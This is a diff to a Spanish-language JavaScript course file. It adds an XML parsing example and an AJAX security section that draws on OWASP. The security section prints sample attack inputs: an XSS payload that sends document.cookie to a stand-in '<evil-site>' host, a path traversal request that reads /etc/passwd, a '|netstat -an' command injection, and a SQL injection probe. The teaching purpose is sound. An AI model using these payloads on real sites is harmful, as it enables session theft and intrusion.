@@ -1477,19 +1477,95 @@ if (condicion) {
 - [XMLHttpRequest.overrideMimeType()](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/overrideMimeType)
 
 
+### Lidiar con eXtensible Markup Language (XML)
+
+![img](../assets/clase4/45a1f0df-97dc-43b8-8511-91b8250b2777.png)
+
+> XML, siglas en inglés de eXtensible Markup Language, traducido como "Lenguaje de Marcado Extensible" o "Lenguaje de Marcas Extensible", es un meta-lenguaje que permite definir lenguajes de marcas desarrollado por el World Wide Web Consortium (W3C) utilizado para almacenar datos en forma legible. Proviene del lenguaje SGML y permite definir la gramática de lenguajes específicos (de la misma manera que HTML es a su vez un lenguaje definido por SGML) para estructurar documentos grandes. A diferencia de otros lenguajes, XML da soporte a bases de datos, siendo útil cuando varias aplicaciones deben comunicarse entre sí o integrar información.1​
+> XML no ha nacido únicamente para su aplicación en Internet, sino que se propone como un estándar para el intercambio de información estructurada entre diferentes plataformas. Se puede usar en bases de datos, editores de texto, hojas de cálculo y casi cualquier cosa imaginable.
+> [Wikipedia](https://es.wikipedia.org/wiki/Extensible_Markup_Language)
+
+```xml
+<!--
+https://www.w3schools.com/xml/cd_catalog.xml
+-->
+<CATALOG>
+    <CD>
+        <TITLE>Empire Burlesque</TITLE>
+        <ARTIST>Bob Dylan</ARTIST>
+        <COUNTRY>USA</COUNTRY>
+        <COMPANY>Columbia</COMPANY>
+        <PRICE>10.90</PRICE>
+        <YEAR>1985</YEAR>
+    </CD>
+    <CD>
+        <TITLE>Hide your heart</TITLE>
+        <ARTIST>Bonnie Tyler</ARTIST>
+        <COUNTRY>UK</COUNTRY>
+        <COMPANY>CBS Records</COMPANY>
+        <PRICE>9.90</PRICE>
+        <YEAR>1988</YEAR>
+    </CD>
+</CATALOG>
+```
+
+```javascript
+function loadXML(url, cb) {
+  var request = new XMLHttpRequest();
+  request.onreadystatechange = function() {
+    if (request.readyState == 4 && request.status == 200) {
+        cb(request.responseXML);
+    }
+  };
+  request.open("GET", url, true);
+  request.send();
+}
+
+function directParser (item, property){
+    return item.getElementsByTagName(property)[0].childNodes[0].nodeValue
+}
+
+loadXML("cd_catalog.xml", function(data){
+    var discos = data.getElementsByTagName("CD");
+    
+    for (var i = 0; i < discos.length; i++) {
+        var disco  = discos[i];
+        console.log("---------------------")
+        console.log("Título:", directParser(disco, "TITLE"))
+        console.log("Artista:", directParser(disco, "ARTIST"))
+        console.log("Año:", directParser(disco, "YEAR"))
+    }
+}); 
+```
+
+```
+---------------------
+Título: Empire Burlesque
+Artista: Bob Dylan
+Año: 1985
+---------------------
+Título: Hide your heart
+Artista: Bonnie Tyler
+Año: 1988
+...
+```
+
+
+https://www.w3schools.com/xml/ajax_xmlfile.asp
+
 ### Seguridad AJAX
 
 ```javascript
-// service.com/hacked 
+// <evil-site>.com/hacked 
 // {data:"<script>alert("¡Sorpresa!")</script>"}
 
 var xhr = new XMLHttpRequest();
-xhr.open('GET', 'http://service.com/hacked');
+xhr.open('GET', 'http://<evil-site>.com/hacked');
 xhr.onload = function() {
     if (xhr.status === 200) {
     	var respuesta = JSON.parse(xhr.responseText)
         console.log("respuesta:", respuesta);
-        document.body.innerHtml = respuesta.data
+        document.body.innerHTML = respuesta.data
     }
 };
 xhr.send();
@@ -1501,12 +1577,129 @@ xhr.send();
 - Nunca encriptar en cliente
 - No confies en la lógica del front
 
+
 **Recursos**
 
 - [Is Your Website Hackable?](https://www.acunetix.com/websitesecurity/ajax/)
 - [AJAX Security Cheat Sheet](https://www.owasp.org/index.php/AJAX_Security_Cheat_Sheet)
 - [Testing for AJAX Vulnerabilities (OWASP-AJ-001)](https://www.owasp.org/index.php/Testing_for_AJAX_Vulnerabilities_(OWASP-AJ-001))
 - [Understanding Ajax vulnerabilities](https://www.ibm.com/developerworks/library/wa-vulnerabilities/index.html)
+- [JSON Hijacking](https://haacked.com/archive/2009/06/25/json-hijacking.aspx/)
+- [Ajax Security Basics](https://www.symantec.com/connect/articles/ajax-security-basics)
+- [Top 10 Ajax Security Holes and Driving Factors](https://www.helpnetsecurity.com/2006/11/10/top-10-ajax-security-holes-and-driving-factors/)
+- [20 high profile sites vulnerable to XSS attacks](https://www.acunetix.com/blog/news/full-disclosure-high-profile-websites-xss/)
+
+
+### Seguridad AJAX: Tipos de Ataques
+
+**Cross-site scripting (XSS)**
+> Cross-site Scripting (XSS) is a technique by which malicious content is injected in the form of HTML/JavaScript code. XSS exploits can be used for triggering various other attacks like cookie theft, account hijacking, phishing, and denial of service.
+> The Browser and AJAX Requests look identical, so the server is not able to classify them. Consequently, it won't be able to discern who made the request in the background. A JavaScript program can use AJAX to request a resource that occurs in the background without the user's knowledge. The browser will automatically add the necessary authentication or state-keeping information such as cookies to the request. JavaScript code can then access the response to this hidden request and then send more requests. This expansion of JavaScript functionality increases the possible damage of a Cross-Site Scripting attack.
+> Also, an XSS attack could send requests for specific pages other than the page the user is currently looking at. This allows the attacker to actively look for certain content, potentially accessing the data.
+> The XSS payload can use AJAX requests to autonomously inject itself into pages and easily re-inject the same host with more XSS (like a virus), all of which can be done with no hard refresh. Thus, XSS can send multiple requests using complex HTTP methods to propagate itself invisibly to the user. 
+> [OWASP](https://www.owasp.org/index.php/Testing_for_AJAX_Vulnerabilities_(OWASP-AJ-001))
+
+
+```html
+
+<script>alert("howdy")</script>
+<script>document.location='http://www.example.com/pag.pl?'%20+document.cookie</script>
+
+<!--
+This will just redirect the page to an unknown and malicious page after logging into the original page from where the request was made
+
+http://example.com/login.php?variable="><script>document.location='http://<evil-site>/cont.php?'+document.cookie</script>
+-->
+```
+
+
+- [DOM based XSS Prevention Cheat Sheet](https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet)
+- [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet)
+- [OWASP Guide to Data Validation](https://www.owasp.org/index.php/Data_Validation)
+- [Testing for DOM-based Cross site scripting (OTG-CLIENT-001)](https://www.owasp.org/index.php/Testing_for_DOM-based_Cross_site_scripting_(OTG-CLIENT-001))
+- [Testing for Stored Cross site scripting (OTG-INPVAL-002)](https://www.owasp.org/index.php/Testing_for_Stored_Cross_site_scripting_(OTG-INPVAL-002))
+- [Testing for Reflected Cross site scripting (OTG-INPVAL-001)](https://www.owasp.org/index.php/Testing_for_Reflected_Cross_site_scripting_(OTG-INPVAL-001))
+
+**SQL Inyections**
+> A SQL injection attack consists of insertion or "injection" of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system and in some cases issue commands to the operating system. SQL injection attacks are a type of injection attack, in which SQL commands are injected into data-plane input in order to effect the execution of predefined SQL commands. [OWASP](https://www.owasp.org/index.php/Testing_for_AJAX_Vulnerabilities_(OWASP-AJ-001))
+
+```
+--- The expected ---
+Client:
+    URL – Typically this would be something like http://www.example.com/rest/user/change_password
+    POST data – {“email”:”xyz@example.com”, “oldpassword”:”oldpassword”, “newpassword”:”newpassword”}
+
+Server:
+    Password changed successfully.
+```
+
+```
+--- SQL Injection Detection ---
+Client:
+    URL – Typically this would be something like http://www.example.com/rest/user/change_password
+    POST data – {“email”:”xyz@example.com‘“,”oldpassword”:”oldpassword”, “newpassword”:”newpassword”}
+
+Important:
+    Qualys WAS tests if the web application is vulnerable to SQL injection attack 
+    by appending the email parameter with SQL injection payload of a single quote (‘), 
+    which results in the following data in the POST request:
+
+Server:
+    {"error":{"message":"SQLITE_ERROR: unrecognized token: 
+    \"d5b5fffc89f961903fb3c9a173f1b667\"","stack":"Error: SQLITE_ERROR: 
+    unrecognized token: \"d5b5fffc89f961903fb3c9a173f1b667\"\n at 
+    Error (native)","errno":1,"code":"SQLITE_ERROR","sql":"UPDATE 
+    Users set password = '5e9d11a14ad1c8dd77e98ef9b53fd1ba' WHERE 
+    email = 'xyz@example.com'' AND 
+    password = 'd5b5fffc89f961903fb3c9a173f1b667'"}}
+```
+
+```
+--- Local File Inclusion Detection ---
+Client:
+    A typical e-commerce web application might have following request for searching of products:
+    POST data – {“query”:”tv”,”order”:”asc”,”limit”:50}
+
+Attack:
+    POST data – {“query”:”/../../../../../../../etc/passwd”,”order”:”asc”,”limit”:50}
+
+Server:
+    You search for:
+    /../../../../../../../etc/passwd</br>root:x:0:0:root:/root:/bin/bash
+    bin:x:1:1:bin:/bin:/sbin/nologin
+    daemon:x:2:2:daemon:/sbin:/sbin/nologin
+    adm:x:3:4:adm:/var/adm:/sbin/nologin
+    lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+```
+
+```
+--- PHP Command Injection Detection ---
+Important: 
+    The same e-commerce application is vulnerable to command injection vulnerability in the query parameter
+Client:
+    POST data – {“query”:”|netstat -an “,”order”:”asc”,”limit”:50}
+
+Server:
+    You searched for: |netstat -an
+    
+    Active Internet connections (servers and established)
+    Proto  Recv-Q  Send-Q  Local Address     Foreign Address     State
+    tcp      0       0     0.0.0.0:22           0.0.0.0:*        LISTEN
+    tcp      0       0     127.0.0.1:631        0.0.0.0:*        LISTEN
+    tcp      0       0     127.0.0.1:25         0.0.0.0:*        LISTEN
+```
+
+
+**AJAX Bridging**
+> For security purposes, AJAX applications can only connect back to the Website from which they come. For example, JavaScript with AJAX downloaded from site1.com cannot make connections to site2.com. To allow AJAX to contact third-party sites in this manner, the AJAX service bridge was created. In a bridge, a host provides a Web service that acts as a proxy to forward traffic between the JavaScript running on the client and the third-party site. A bridge could be considered a 'Web service to Web service' connection. An attacker could use this to access sites with restricted access. [OWASP](https://www.owasp.org/index.php/Testing_for_AJAX_Vulnerabilities_(OWASP-AJ-001))
+
+**Cross Site Request Forgery (CSRF)**
+> CSRF attacks occur when an attacker forces a victim’s web browser to send an HTTP request to any website of his choosing (the intranet is a fair game as well). For example, while reading this post, the HTML/JavaScript code embedded in the web page could have forced your browser to make an off-domain request to your bank, blog, web mail, DSL router, etc. In case such applications are vulnerable, invisibly, CSRF could have transferred funds, posted comments, compromised email lists, or reconfigured the network. A characteristic of CSRF attacks is that the vulnerable application logs' will show what appear as legitimate entries originating from the victim, bearing no trace of the attack. This attack, though not common, has been done before. [OWASP](https://www.owasp.org/index.php/Testing_for_AJAX_Vulnerabilities_(OWASP-AJ-001))
+
+**Denial of Service**
+> Denial of Service is an old attack in which an attacker or vulnerable application forces the user to launch multiple XMLHttpRequests to a target application against the wishes of the user. In fact, browser domain restrictions make XMLHttpRequests useless in launching such attacks on other domains. Simple tricks such as using image tags nested within a JavaScript loop can do the trick more effectively. AJAX, being on the client-side, makes the attack easier. [OWASP](https://www.owasp.org/index.php/Testing_for_AJAX_Vulnerabilities_(OWASP-AJ-001))
+
+`<img src="http://example.com/cgi-bin/ouch.cgi?a=b">`
 
 ### Datos Abiertos
 
@@ -1517,6 +1710,7 @@ xhr.send();
 - [Open NASA](https://open.nasa.gov/open-data/)
 - [Datos Abiertos de Mexico](https://datos.gob.mx/)
 - [The home of the U.S. Government’s open data](https://www.data.gov/)
+
 
 
 ### Fetch, una alternativa a XMLHttpRequest
